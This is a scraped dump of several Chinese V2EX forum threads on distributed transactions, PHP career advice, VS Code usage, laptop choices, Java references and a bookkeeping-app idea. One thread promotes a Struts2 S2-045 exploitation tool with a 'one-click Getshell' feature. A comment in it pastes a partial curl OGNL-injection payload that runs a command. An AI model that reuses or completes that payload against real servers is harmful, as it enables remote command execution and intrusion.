：事务是数据库的逻辑工作单位，事务中包括的诸操作要么全做，要么全不做。</p>\n</li>\n<li>\n<p><strong>一致性 (Consistency ）</strong>：事务执行的结果必须是使数据库从一个一致性状态变到另一个一致性状态。一致性与原子性是密切相关的。</p>\n</li>\n<li>\n<p><strong>隔离性 (Isolation ）</strong>：一个事务的执行不能被其他事务干扰。</p>\n</li>\n<li>\n<p><strong>持续性 /永久性 (Durability ）</strong>：一个事务一旦提交，它对数据库中数据的改变就应该是永久性的。</p>\n</li>\n</ul>\n<p><img alt=\"\" src=\"http://blog.daocloud.io/wp-content/uploads/2017/03/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7-2017-03-08-%E4%B8%8B%E5%8D%8812.07.30.png\"></p>\n<h1>分布式事务</h1>\n<h2>Use Case</h2>\n<h2>A 账号向 B 账号汇钱</h2>\n<h2>Solution</h2>\n<h2>本地事务</h2>\n<ul>\n<li>事务开始</li>\n<li>从 A 帐号中把余额读出来。</li>\n<li>对 A 帐号做减法操作。</li>\n<li>把结果写回 A 帐号中。</li>\n<li>从 B 帐号中把余额读出来。</li>\n<li>对 B 帐号做加法操作。</li>\n<li>把结果写回 B 帐号中</li>\n<li>事务结束</li>\n</ul>\n<h2>如果跨行转账呢？</h2>\n<p>在分布式系统中，每个节点虽然可以知晓自己的操作时成功或者失败，却无法知道其他节点的操作的成功或失败。</p>\n<p>当一个事务跨越多个节点时，为了保持事务的 <strong>ACID</strong> 特性，需要引入一个作为协调者的组件来统一掌控所有节点(称作参与者)的操作结果并最终指示这些节点是否要把操作结果进行真正的提交(比如将更新后的数据写入磁盘等)。</p>\n<h3>两阶段提交</h3>\n<p><img alt=\"\" src=\"http://blog.daocloud.io/wp-content/uploads/2017/03/%E4%B8%89%E5%88%86%E9%92%9F-1.png\"></p>\n<p><strong>第一阶段 |  Vote</strong></p>\n<ul>\n<li>\n<p>协调者会问所有的参与者结点，是否可以执行提交操作。</p>\n</li>\n<li>\n<p>各个参与者开始事务执行的准备工作：如：为资源上锁，预留资源，写 undo/redo log ……</p>\n</li>\n<li>\n<p>参与者响应协调者，如果事务的准备工作成功，则回应“可以提交”，否则回应“拒绝提交”。</p>\n</li>\n</ul>\n<p><strong>第二阶段 |  Decision</strong></p>\n<ul>\n<li>\n<p>如果所有的参与者都回应“可以提交”，那么，协调者向所有的参与者发送“正式提交”的命令。参与者完成正式提交，并释放所有资源，然后回应“完成”，协调者收集各结点的“完成”回应后结束这个 Global Transaction 。</p>\n</li>\n<li>\n<p>如果有一个参与者回应“拒绝提交”，那么，协调者向所有的参与者发送“回滚操作”，并释放所有资源，然后回应“回滚完成”，协调者收集各结点的“回滚”回应后，取消这个 Global Transaction 。</p>\n</li>\n</ul>\n<h1>二阶段提交问题</h1>\n<ol>\n<li>同步阻塞操作，必然会非常大地影响性能。</li>\n<li>另外是超时问题，比如，</li>\n</ol>\n<ol>\n<li>\n<p>如果第一阶段中，参与者没有收到询问请求，或是参与者的回应没有到达协调者。那么，需要协调者做超时处理，一旦超时，可以当作失败，也可以重试。</p>\n</li>\n<li>\n<p>如果第二阶段中，正式提交发出后，如果有的参与者没有收到，或是参与者提交 /回滚后的确认信息没有返回，一旦参与者的回应超时，要么重试，要么把那个参与者标记为问题结点剔除整个集群，这样可以保证服务结点都是数据一致性的。</p>\n</li>\n<li>\n<p>糟糕的情况是，第二阶段中，如果参与者收不到协调者的 commit/fallback 指令，参与者将处于“状态未知”阶段，参与者完全不知道要怎么办，比如：如果所有的参与者完成第一阶段的回复后（可能全部 yes ，可能全部 no ，可能部分 yes 部分 no ），如果协调者在这个时候挂掉了。那么所有的结点完全不知道怎么办（问别的参与者都不行）。为了一致性，要么死等协调者，要么重发第一阶段的 yes/no 命令。</p>\n</li>\n</ol>\n<h1>三阶段提交</h1>\n<p><img alt=\"\" src=\"http://blog.daocloud.io/wp-content/uploads/2017/03/%E4%B8%89%E5%88%86%E9%92%9F-2.png\"></p>\n<ul>\n<li>\n<p>三阶段提交把二阶段提交的第一个段 break 成了两段：询问，然后再锁资源和最后真正提交。</p>\n</li>\n<li>\n<p>三段提交的核心理念是：在询问的时候并不锁定资源，除非所有人都同意了，才开始锁资源。</p>\n</li>\n</ul>\n<p><strong>作者介绍</strong></p>\n<p>王天青， DaoCloud 首席架构师，曾先后在麻袋理财担任职首席架构师， EMC 中国研究院任职主任工程师，工作十多年间，做过前端，做过后端， 对云计算有深入了解。目前对云原生应用之微服务架构及敏捷的基础架构（ Docker ）有比较多的研究和实践，同时对大型网站的技术架构有比较多的认识和实践，在 DaoCloud 负责企业客户应用微服务架构转型。</p>\n</div></div>"], "reply": "4", "tittle": "3 分钟学习微服务系列 | 事务及分布式事务", "comment": ["实际上三阶段存在一种 corner case ：\r", "如果 coordinator 和一部分 follower 一起挂了，或者 coordinator 也会 commit\r", "那么剩下的 follower 就无法决定了\r", "如果挂了的 follower 投了拒绝，按定义其他人应该都拒绝\r", "如果挂了的 follower 投了通过，那就有可能 coordinator 已经收齐了所有票，告诉挂了的 follower 提交，却没来得及通知活着的 follower 。按定义，只要有一人提交，所有其他人必须提交。\r", "\r", "所以还有 4PC\r", "\r", "实际上同时挂的可能性不大，所以还是 3PC 。如果有其他途径检测挂了的 follower 是否 commit 过，也没有问题。如果 followers 复活时是无状态的，也没有问题。", "3PC 实际应用很多，不过需要同步分布式系统。如果延迟波动很大，则不一定适用，要看情况分析。", "其实微服务架构中已经不推荐分布式事务，采用最终一致还有定时对账", "傻了，我好像说错了，我说的是 2PC 的问题\r", "解决就是 3PC\r", "惭愧惭愧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>早上看到有人发的《我值多少钱》的帖子，好奇也想问一下自己的职业规划</p>\n<p>实际工作时间一年半，在两家电商公司工作过，都是从事的后端开发</p>\n<ul>\n<li>熟练使用的语言： PHP</li>\n<li>其他学习过的语言：学校里学过 C\\C++\\Java\\数据结构,自学过一丢丢 javascript 和 node.js</li>\n<li>用过的框架： Yii 、 magento 、 Yaf</li>\n<li>用过的 IDE （或编辑器）： PHPStorm 、 VSC 、 sublime 、 ATOM 、 MVIM</li>\n<li>用过的系统： Windows 系统、 OSX 系统(Linux 用不惯)</li>\n<li>主要工作： api 接口设计，与前端联调，线上 bug 修复</li>\n<li>mysql 数据库的基本操作，增删查改 join 、 group 等，懂一些索引和慢查询的注意事项</li>\n<li>会使用的常用 shell 命令和常用的 Vim 命令，可以在服务器上查看 nginx 、 php 错误日志</li>\n<li>会搭建 nginx(apache)+mysql+php(+php-fpm)环境，错误日志，配置文件</li>\n<li>redis 使用，配置，原子性，之前也用过 memecache</li>\n</ul>\n<p>请问：我后面应该怎么进阶学习呢</p>\n</div></div>", "<div class=\"topic_content\">补充下：现在工作的很开心，并不是要换工作所以给大家看简历，也很清楚自己不过是个刚入门的菜鸟罢了，也做好了被喷的准备。\r<br>\r<br>先简单介绍下自己：我并不是科班出身，之前也是学的生物专业，偶然机会下被实验室安排搭建网站，看视频自学的 html,css,php,觉得有意思才决定从事 IT 行业，深知自己的基础跟科班的比起来是很差劲的。\r<br>\r<br>之前第一份工作的时候，因为是校招并不要求马上投入工作，开始花了三个月时间从头开始学习的 PHP ，然后一直做的是 api 开发，公司是成熟的大公司，用的是 Yii, 平时是没有机会接触到数据库服务器的，个人感觉对自己的提升并不大，加上跟女朋友是异地，就在八个月后去上海重新找了一份工作。\r<br>\r<br>第二份工作是在一家年轻的创业公司，主要用的是 magento 框架，后期也用了其他的 php 框架，基本上只要是跟后端开发相关的东西都能接触到。包括但不限于：直接在服务器上 debug ；直接写 sql 查询；处理慢查询；设计表；写数据库升级脚本；设计 redis key ；中间经历过双十一活动也涉及到高并发时的 redis 使用和 mysql 读写；队列的使用等等。截止到目前为止已经在公司待了十个月左右，在这十个月里更加热爱后端这份工作。\r<br>\r<br>前面罗列出来的 ide 编辑器并不是觉得这些算技能什么的，想表达的是我是个十足的工具控，特别喜欢尝试各种软件。比如所有的编辑器,Alfred,oh my zsh 等等\r<br>\r<br>发帖子的原因是由于平时工作的时候还是以业务为主，感觉自己有点偏离方向了，迷茫之下找大神指点迷津。所有的评论都看过了，一些评论虽然尖锐，初看是有点不舒服，但仔细琢磨确实很有道理，让我对今后的职业规划有了更清晰的认识，在此一并感谢。</div>"], "reply": "33", "tittle": "后端开发，我应该怎么提升自己的水平", "comment": ["讲真你这顶多算初级水平啊", "vsc 不是 IDE 吧", "用不惯 Linux 怎么解决本地和线上环境差异问题。。", "把“用过”改成“研究过”..", "感觉没什么出彩的", "linux 用不惯...\r", " 这一句话  就看出水平了", "想问一下楼主目前多少 K ，在哪个城市", "我也工作一年半，我带的新人和你差不多", "Linux 用不惯 这个可以说，在日常休闲娱乐中比较少用到 Linux ，", "消息队列， RPC ， PHP 扩展开发等", "加油 v2 大佬多的是 \r", "别怕他们喷你技术差 相信自己能提升的\r", "我感觉后面还是有人要喷你 默哀= =", "楼主最大的问题就是两个字“用过”", "加油~同后端猿=。=", "我最近面试了一些公司，问了技术牛，需要成为中高级 PHP 工程师 ，第一是得会数据建模，就是会设计好数据表，具有良好的可拓展性。第二的话，就是得懂原理，多看框架的源码", "还得慢慢提升自己，学精才好。", "貌似互联网都是讲分布式处理业务。\r", "所以数据库建模和业务设计都要考虑可以分布式部署。\r", "\r", "然后就是一些高并发业务的处理经验。\r", "像我踩到过 Redis keys 这个 API 的坑，搜索多个 key 很方便，但是数据量大了效率很低，不能用。\r", "MySQL join 在表数据大的时候效率低，不能用。必须在程序借助 Redis 之类的缓存 ID 与其它字段的映射列表，先根据搜索条件查 ID ，再拿 ID 去另一个表取数据。\r", "数据库设计的时候，用户强一致性的操作不能做主从分离，必须读写都在主库上，为了避免单点负载，这种强一致性的表数据还得预留一致性哈希的配置，方便拆分。\r", "还有一些性能调优的经验，懂原理在生产环境出故障的时候，看看网络封包数量、内存占用率、 CPU 使用率，应用的日志，就可以很快定位系统瓶颈，是业务代码的问题，还是数据库的问题。\r", "\r", "什么时候加服务器，什么时候加数据库，缓存加到什么地方之类的，我刚入门的时候对这些都是一脸懵逼状态，现在也只是能勉强听懂为什么要这么改，至于怎么查出来的，还是不太理解。估计我都弄懂这些就能跨进初级工程师的行列了。", "看来自己也是勉强属于一个初级 PHP 。大神们，继续共享中级以上的知识点。", "熟练使用的语言： PHP\r", "\r", "这个再加点量， python 啊， golang 啊，都是你的好帮手，还有 shell 要熟练。这可以作为同一个队列，写工具很方便\r", "\r", "其他学习过的语言：学校里学过 C\\C++\\Java\\数据结构,自学过一丢丢 javascript 和 node.js\r", "\r", "都拿来做做项目，哪怕是做一个 bitmap 用来做 key 是否存在的查询这样的小东西也是可以。然后自行对比语言和语言在工作和功能上的差异。主要关注缺点。\r", "\r", "用过的框架： Yii 、 magento 、 Yaf\r", "放弃框架，自己造个轮子。做个博客应该就够了。这你会涉及到 router ，模板，中间件以及 IOC 这些核心的原理。光看是没什么用的，转头就会忘。提醒，可以不用 php 写，拿你想做为第二语言来写。如 nodejs ， python 之类的。这个轮子不是开源和上线用的。自行学习玩，做自己的项目\r", "\r", "用过的 IDE （或编辑器）： PHPStorm 、 VSC 、 sublime 、 ATOM 、 MVIM\r", "忘记掉这个吧，也别写简历里。。。编辑器之争没啥意思。。。恩，我得大叫一声 jetbrains 爸爸好。 jetbrains 大法宇宙无敌\r", "\r", "用过的系统： Windows 系统、 OSX 系统(Linux 用不惯)\r", "linux 用不惯也得用。。当然，直接换成 osx 也行。最少够用。没什么蛋疼的。 V2EX 里会写操作系统的应该不会占 90%吧\r", "\r", "mysql 数据库的基本操作，增删查改 join 、 group 等，懂一些索引和慢查询的注意事项\r", "分布式，还有数据库的基本组件，如视图，触发器之类的。其实有些时候很有用。当然，另一些东西在某个场景里又没法用。分清楚原理。有时间可以看看 mysql 源码。。或者如果只是想用的好，搞本讲 sql 的书来。拆细了 sql 有很多东西可以讲\r", "\r", "\r", "会搭建 nginx(apache)+mysql+php(+php-fpm)环境，错误日志，配置文件\r", "做成自动部署~会让你明白的更多。。当然这不算技能啦。。。大公司有 ops 。小公司又 leader 。。。。编译点东西可不算啥技能。和安装软件一样。。\r", "\r", "\r", "redis 使用，配置，原子性，之前也用过 memecache\r", "redis 的代码就几千行（看老点的版本，最新的加了太多的功能）。。一个星期就能撸完。撸完你会发现打开了一个新的世界。\r", "\r", "没了。。。。", " 对 编辑器", " 目前除了文件名大小写外 还没有碰到过线上服务器和本地不同的地方 以后会注意这方面 3q", " 确实是初级水平", " 已收藏 蟹蟹", " \r", " 非常感谢！！", "年轻人，你渴望力量吗？！\r", " 3q  正是我需要的", "握抓。", "你这顶多是 web 业务逻辑开发吧，个人感觉，严格来讲不算后端，而且，熟悉 Linux 是一个合格后台的基本素质。\r", "\r", "后端的话，建议多了解基于 java 、 c 、 c++， python 等优秀的开源项目，可以看看源码，例如： zeromq(c++),  c(redis)、 hadoop(java)、 tornado(python)\r", "\r", "目前来讲比较火的，可以试试搭建 hadoop 集群，玩玩 zk ， hbase ， kafka 等，体验下分布式集群和大数据应用\r", "\r", "我不是引战， PHP 这门语言天生是搞 web 的好手，但是不应该被套上“后台”语言的帽子。无论什么语言，物尽其用，才是一个合格后台人员的素质。当我们谈论 PHP ，其实更多是讨论如何实现一个系统应用层、上层业务逻辑的东西，而这些东西再怎么深入，很难进行更为底层的优化。像你说到的几个 PHP 框架，其实都基本是 app 框架，也就是我们说的业务侧框架。\r", "\r", "而我们应该讨论的通用的后台技术，其实应该更多是： connect server 、消息队列、网络框架、数据库方面：例如如何让系统实现真正的实时调度，如何真正科学管理集群或者主从数据库，如何设计 Hbase 的 rowkey 、如何实现读写分离，何为 CAP 理论等等；\r", "\r", "。。。。。。。。。。\r", "\r", "说了一堆废话，不就是想告诉你：“ PHP 也许是世界上最好的语言，但是要成为一个牛 B 的后台，这和语言真的没有必然的关系”\r", "\r", "加油", "学生物的，我也是😂", "PHP 也许是世界上最好的语言", "不， PHP 是世界上最好的语言", "不， PHP 是世界上唯一最好的语言", "不， PHP 不是语言，是一种职业：拍黄片"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>刚刚看到这个漏洞这么火，顺手写了个简易版本的检测工具，带 GUI ，目前只支持命令执行\nUI 翔一样就翔一样吧，控件起码对齐了\nMFC 写的你怕不怕\n各位表哥路过给点个 star 吧 :-)</p>\n<p><a href=\"http://github.flyshit.pw/github.html\" rel=\"nofollow\">http://github.flyshit.pw/github.html</a></p>\n</div></div>", "<div class=\"topic_content\">已经添加 release 啦，拖下来就能用\r<br>V2EX 怎么换行不对劲？</div>", "<div class=\"topic_content\">更新版本啦，新版本功能包括\r<br>命令执行\r<br>网站根目录获取\r<br>文件上传\r<br>一键 Getshell</div>"], "reply": "13", "tittle": "Struts2 S2-045 漏洞检测利用工具 Exp GUI 版", "comment": ["已点 star", "发布个二进制 release 会方便不少.", "好丑的头像", "可以可以", "这个可以有", "fatal error: 'SDKDDKVer.h' file not found", "已 star ，昨天还在用 python 的 poc 检测", "昨天紧急修复了这个漏洞", "试了一下感觉还挺好玩的", "Struts2 又爆漏洞。。。这玩意还是别用了吧", "curl -H \"Content-Type:%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new ", "; \"url\"‘\r", "所以你告诉我 gui 有何用", " \r", "谢谢感谢~\r", "版本已经更新啦，新版本功能包括 \r", "命令执行 \r", "网站根目录获取 \r", "文件上传 \r", "一键 Getshell", " 要是 wooyun 还在，这几天又可以看到表哥们刷 rank 了 :D"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>根据我的<a href=\"https://marketplace.visualstudio.com/items?itemName=formulahendry.code-runner\" rel=\"nofollow\">Code Runner 插件</a>的 telemetry 数据来分析了下 Visual Studio Code 的使用情况，发现超过一半的用户是 Python+Node 的，大家看看实际情况是不是真的这样呢~\n<a href=\"https://blogs.msdn.microsoft.com/formulahendry/2017/03/08/visual-studio-code-usage-analysis-round-2/\" rel=\"nofollow\">https://blogs.msdn.microsoft.com/formulahendry/2017/03/08/visual-studio-code-usage-analysis-round-2/</a></p>\n<p><img alt=\"overall\" src=\"https://msdnshared.blob.core.windows.net/media/2017/03/overall.png\"></p>\n</div></div>"], "reply": "28", "tittle": "Visual Studio Code 使用情况分析", "comment": ["配图中的是什么工具", "我用来写 ruby+python", " #1 Application Insights", "我主要写前端 JS 的，据说 vsc 可以直接 debug node ？", "写 node ，想拿来写 php 尝试一下滚回了 ps ，版本控制工具差距太大", "昨天刚从 Atom 换到 VS Code ，目前粗略感觉后者结合了 Atom 和 WebStorm 的优点。就编辑器而言，企业出品还是比社区出品要更产品化一些，体验细节略胜一筹。", "我写 python/node/rust", " 对的！浑然天成，极为方便", " PhpStorm 可是收费的哦。话说 PhpStorm 版本控制工具做的很好吗？以前写 WordPress 一直用 PhpStorm ，但没用过他的版本控制工具，从来都是直接 git 命令行~", " 那是~VS Code 的老大可是 Erich Gamma ： ", " ，做出来的东西绝对好的呀", "比如，像我这样只写前端的话，可能也不会用到这个扩展吧 - -", " 比如我在写 js 时，想 run 一下某段 code snippet ，就有用啦", "写 TypeScript 比较舒服", "拿来写 c 和 python 路过", "用了 jetbrains 系列后就不用浪费时间在其他编辑器了", " JB 家的 IDE 都差不多一个路数吧， PHPstore 和 PyCharm 我都有用，内置的 git 就感觉中规中矩，一些很 fancy 的特性没有（比如 -S ），但是一键提交 /merge/rebase 还是很方便的", "写 Node + CoffeeScript + F#", "C", "Python3", " 一般我会打开浏览器的开发者工具…… node 环境和 browser 环境还是有点差异的", "我写 typescript 用 vscode", "我用来写 Go 的……", "vsc 插件还是没办法跟 sublime 比", " 哪些插件缺失或者哪些方面不好呢？", "python", "启动慢了点（看和什么比拉，反正作为一个款编辑器，他的启动速度确实不尽人意），插件少，不管和谁比，都是少。使用上还不错，也是个习惯问题。习惯了啥都好说。", "Python JS", "写写前端， React 什么的"]},
{"content": ["<div class=\"topic_content\">配置前使用 HTTP 访问，登录页面可以正常提交表单，登录成功。\r<br>\r<br>配置数字证书后， HTTPS 可以正常登录提交表单，但是 HTTP 访问，登录页是可以打开的，表单提交就不行，没有任何错误提示，感觉就是把当前页面刷新了一下，控制台有个告警：\r<br>\r<br>This page includes a password or credit card input in a non-secure context. A warning has been added to the URL bar. For more information, see <a target=\"_blank\" href=\"https://goo.gl/zmWq3m\" rel=\"nofollow\">https://goo.gl/zmWq3m</a>.\r<br>\r<br>这是什么情况？</div>"], "reply": "目前尚无回", "tittle": "阿里云服务器配置了数字证书问题", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如标题所说，他在学习 Unity3D ，限定只能是戴尔的，原因就不说了。价格的话控制在 8K 以内最好，还望大家能给点机型参考，谢谢！</p>\n</div></div>"], "reply": "35", "tittle": "朋友正在学习编程，想买台戴尔的笔记本来用，请求大家推荐下型号", "comment": ["为什么学编程用笔记本？这个价格配个台式机编程绝对舒服，买笔记本有点尴尬，刚刚能入门高端笔记本但是买外星人又不够。", "他就是想买台新电脑，跟编程没关系", " 我们开会要带电脑去的，而且电脑公司报销，可以拿回家用。台式机？😄，哈哈", "Dell Latitude", " 你说的很对😂", "dell latitude or xps", "2L 暴击", "我看到油管好多程序员用 mac ，自带 python 很方便，能够很优雅的写程序，话说回来，为何 windows 本子不预装 python 呢？", "Unity3D ？ Latitude 的显卡带不动吧，可以考虑上 Precision ，不过预算就有点少了", "8k 内除非上船或者台机，其他没一个带的动 unity 的。", " 没你说的那么夸张，，，", "U3D 别推荐轻薄本了，性能不一定够，游戏本靠谱点", " 跟他说了下大家的看法后，他决定加到两万，品牌不限了_(:3 」∠)_", "你朋友都知道根据自己需求排除台式机牌子也选好戴尔了，居然会不知道选哪款？", "没看到楼主的更新，刚才的回答过气了。随便一个笔记本再搭配拼一个台式机才是靠谱的方法。", "既然是戴尔的笔记本，肯定是顶配外星人啊。", "崴型人，只知道这个🙃", "😆😸🐳🐌", "不限品牌那就直接未来人类啊，要什么垃圾戴尔", " 朋友你是说比起未来人类 dell 是垃圾的那个？", "XPS 15 Dev Edition, 比搭载 Win10 的便宜一百刀. 屏幕好性能足, 而且不在接口上吝啬.", "刚回复完发现又改需求了...\r", "20K 预算果断 Precision 5510/7510/7710 啊.", " Mac 自带的工具链普遍很老，还是得自己装，没什么特别的优势", "Unity3D 又不是 3ds Max ， Intel HD3000 核显 都能带的动，模型加工整理可以用 C4D 、 Blender 等对性能要求低的软件，而不是笨重经常 GG 的 3ds Max 。 8000 以内的机器 3 年完全可以满足要求。", " 你这样去开公司试试，员工全跑了。\r", " 加到 2w ， dell 官翻 precision 走起。估计能搞到顶配。不黑，真的建议官翻，一样 3 年保修，比全新便宜不少钱，机器一样。", "加点预算或者海淘， XPS 15 9550 妥妥的", " win 里的程序又不像 linux 那么多 py 依赖", "官翻顶配 5510 ，要联保有联保，性价比有性价比。", "dell M6800 二手", " 你买个 windows 本子 我帮你装 python 只要收费 500 比 mac 和 windows 本子价差便宜", "在乎性能就买 latitude 系列\r", "不在乎性能买 xps 系列\r", "\r", "结论应该是 latitude", "xps 不用考虑", " 是这样的，只选戴尔笔记本有客观因素在里面，他本人对电脑了解得不多的。", " 戴尔除了美帝有官翻，国行没有的吧", "戴尔游匣, 绝对性价比呀!"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>遇到一个题目：获取树的叶子节点并删除叶子节点</p>\n<p>这是我的代码：</p>\n<pre><code>private List&lt;Integer&gt; getLeaves(TreeNode root, List&lt;Integer&gt; leaves) {\n\tif(root == null){\n\t\treturn null;\n\t}\n\tif(root.left == null &amp;&amp; root.right == null){\n\t\tleaves.add(root.val);\n\t\t// delete this node\n\t\troot = null;\n//\t\troot.val = -1;\n\t} else {\n\t\tgetLeaves(root.left, leaves);\n\t\tgetLeaves(root.right, leaves);\n\t}\n\treturn leaves;\n}\n</code></pre>\n<p>跑完上面的代码，我发现叶子节点获取到了，但是没有被删除。\n我把赋空注释掉，改为修改叶子节点的值，发现是可以修改的。</p>\n<p>我重新写了一个例子：</p>\n<pre><code>TreeNode root = new TreeNode(1);\nTreeNode rootTemp = root;\n\nSystem.out.println(\"origin root : \" + root);\nrootTemp.val = 2;\nSystem.out.println(\"after change rootTemp'val, root.val : \" + root.val);\nrootTemp = null;\nSystem.out.println(\"after change rootTemp, root : \" + root);\nrootTemp = new TreeNode(3);\nSystem.out.println(\"after change rootTemp, root : \" + root);\n</code></pre>\n<p>发现修改值和修改引用是两种操作。</p>\n<p>重新写了一个方法：</p>\n<pre><code>System.out.println(\"origin root : \" + root);\nchangeReference(root);\nSystem.out.println(\"after reference, root : \" + root);\n\nprivate void changeReference(TreeNode root) {\n\troot = new TreeNode(3);\n}\n</code></pre>\n<p>根据打印的结果，发现修改形参无法影响到实参 root 。</p>\n<p>那么如果一个方法中，形参是对象类型的。</p>\n<p><strong>有办法修改 Java 形参的引用，来达到修改实参的目的吗？</strong>（比如重新 new 一个对象或者赋值为 null ）</p>\n</div></div>"], "reply": "9", "tittle": "如何正确修改 Java 形参的引用？", "comment": ["Java 里只有 reference by value 这种说法～，新的函数里更改原来的值会影响，要不 linkedlist 里各种 dummy 就用不了了", "你可以另外做个容器包一层，然后每次要实现这种效果就把东西扔容器里，再把容器传过去就好", "一楼是想说 pass by value 吧\r", "\r", "形参只是实参的一个引用副本，修改值是通过同一个引用修改当然没问题，但是修改引用只是把当前栈帧上的本地变量给置空，不会对原栈帧的变量造成影响\r", "\r", "二楼的方法可以一试，或者你给 Node 提供一个 empty 方法以及 isEmpty 方法，以后不要用 null 来判断而用 isEmpty ，清空 node 可以调 empty()，如果希望 node 被回收就把引用断开", "做不到， 3L 把原因说的很清楚了。\r", "\r", "你可以考虑在 TreeNode 对象里保存该结点的父结点和该结点在父节点的位置，来实现该结点在父节点的删除。", "java 哪有什么形参实参", "可以先获取叶子节点的父节点 然后 parent.left=null\r", "parent.right=null", "changeReference(root);\r", "其实这个方法里边传进去的是个引用，但是并不是 root 本身，其实就是 root 的一个副本。引用可以理解为一个指针， root 本身和副本指向同一个地址，但你在函数里 root = new TreeNode(3);其实是讲那个副本指向了一个新地址，再修改肯定对原来的没影响。", "java 没有指针也没有 & 符号\r", "\r", "另外，形参实参也不是这个概念吧", " 是，就是 pass by value ～顺便 @ 我一下哈，差点都没看见。"]},
{"content": ["<div class=\"topic_content\">尝试了很多次很多款记账 app ，这类东西就不适合懒人用\r<br>\r<br>我想起头做一个适合程序员朋友和高级用户如 PM 等类人用的记账服务\r<br>\r<br>服务器部署在 lean 等上面，手机上设置短信转发\r<br>\r<br>每一笔刷卡短信提醒会自动记录时间金额，有个界面进去让你给这条记录打标签，固定回顾时间，通过标签来统计出入金额</div>", "<div class=\"topic_content\">这里高级用户是指电脑手机的高级用户高级用户，但还没开始记账的人，不是理财记账的高级用户</div>", "<div class=\"topic_content\">这个贴貌似火了, 我打个广告可不可以?  <a target=\"_blank\" href=\"/t/346130\">/t/346130</a> 美团前端招人</div>"], "reply": "48", "tittle": "程序员朋友们，我们一起来做个记账 app 吧", "comment": ["都懒人了还要让他进界面打标签？所以楼主理解的懒是……？", "这个需求只有安卓可以做， iOS 是不行的。", "浪费时间！", " 复制短信进去软件自动粘贴。", "当然介意隐私就算了。", "在用随手记 , 最介意就是它的启动几秒的广告.还有操作不够便利.一些功能不想要.\r", "我可以做 Android 端.", "付费的话，可以帮你做 iOS 端，其实我也用过这样子一个 app ，但是感觉麻烦，就放弃使用了", "随便问一句： PM 是产品经理吗，为什么 PM 是高级用户", "读短信涉及隐私，有的用户会介意。\r", "除了短信通知的，现在很多也在支付宝、微信上付款，只做短信部分，感觉还是不够用。", "搞这个 app 应该找个专业的财务人员参与，至少做出一个个人资产负债表。没有规范的瞎做，成功是巧合，失败是必然。", "懒是第一大问题 隐私是第二大问题 现在能用支付宝就用支付宝 信用卡账单也给支付宝 就不剩多少需要手动记到支付宝记账本里了 瞧 只用信任支付宝生活简单很多", "随手记", "产品朋友们，我们搞个 PPT 改变世界吧！", "我基本全走支付宝，然后支付宝就有记账本", "基本不用现金消费 账目信息支付宝或者微信支付 基本上都记录好了", "网易有钱都不用短信转发直接登录各种网银获取……我觉得就已经挺懒人的了，除了安全性有一些问题之外", "开发记帐本可以，如果用自带的 excel 不方便操作，，，", "微记账：这是一款智能语音生活记账软件，口袋里的随手记账工具，账本、账单轻松管理，比挖财、口袋记账、随手记、 timi 记账(记帐)更便捷好用的记账本软件。 ，大家用过这几款，有什么缺点和优点，说说", "10 来年过去了，这种应用应该见过上百个了吧，没啥用的\r", "Windows Mobile 年代这种应用就满天飞，用得人很少", "可以的啊，一起来搞", "美国 Mint 用户，感觉这类软件需要的是能和各个消费渠道的银行或支付 APP 那拿到可以让用户认可安全的 API 接口，让用户输入始终不是懒人的。国内再用网易有钱，接口仍不够全面。", "看回复，信任马某人的还挺多的。但是不明白这个自信是哪里来的？", " 我也这么觉得……不懒就能解决好几个问题了哈哈哈", "有财务概念的人，你这个想法目前不靠谱。金融机构 API 参考 Moneywiz Premium 服务。\r", "\r", "没有财务概念的人，你的产品也是面向这类用户，和流水账 App 抢市场，类似的已经不少了。这个不用程序员，你自己先调研清楚为什么比别人强再说吧。看你写的都是空想。", "幸好你这不是产品经理，不然又得黑一顿。", "进了 gnucash 的坑就出不来了", "你需要 GNUCash", "这个东西我觉得应该是腾讯系出来割韭菜的项目，如果啥都有微信支付，手帐这东西就是微信的消费报告了", "说实话，记账这事，录入的信息太少了，达不到分析效果，录入信息太多了，使用的门坎就高了。而且关键是个人习惯。愿意记账的人，以前都写纸上，不愿意记账的人，手机里装几个软件也没用。\r", "\r", "如果真的是高级用户，那就得老老实实建资金账户、消费商家。一笔一笔记消费收入转账借贷。\r", "\r", "而且记账软件这事，不管是开发还是运营，都是个长时间的事情。软件弄个几年不维护了，那就吭人了。", "这年头连可行性分析都不做就来忽悠人了么", "不如把每月的邮件账单转发到特定的邮箱，这样就可以把账单自动整理出来了。个人不喜欢 app 获取短信。", "做个自己用可行，对于自动读取短信来记账的 app 我反正对于个人隐私安全问题是挺有顾虑的。", "Money Pro", "只有我是靠超市小条来记账的吗。。。", " 你不是一个人", "刷卡短信？信用卡每月都会发账单详情到邮箱", " iOS 短信读取如何实现呢", " 我也想知道", " 所以你想不想要个玩具能整理归纳超市小条的？\r", "\r", "我最初的想法是将小条拍照，然后用开源 ocr 转成文字，保存到本地或者其他地方。然而测试的结果离我想象的太远，这个玩具就没再继续往下写。", "感觉网易有钱足够我用了", "记账只想能自动统计所有财物就好了.. 但是又不想给权限哈哈哈哈", "\"一言不和就自己做个 app\"系列", " 总结到位, 就差去注册一个域名了", "曾经我也是这么想的  后来做的也都是蛮简洁的 \r", "TODO 类型的 网页端 一点就好了\r", "可是后来懒得都不用了 :)", "网易有钱 +1 ，从随手记用到各种 iPhone 上的各种 App ，最近开始用网易有钱，各种信用卡借记卡一连，自动同步了，多好，唯一的广告就一个理财 tab 。我也给自己写过 web 版的记账应用，数据可视化，酷炫的表，然后懒得用了，只维护个数据库脚本了。", "网易有钱 好用", "毕业设计做过", 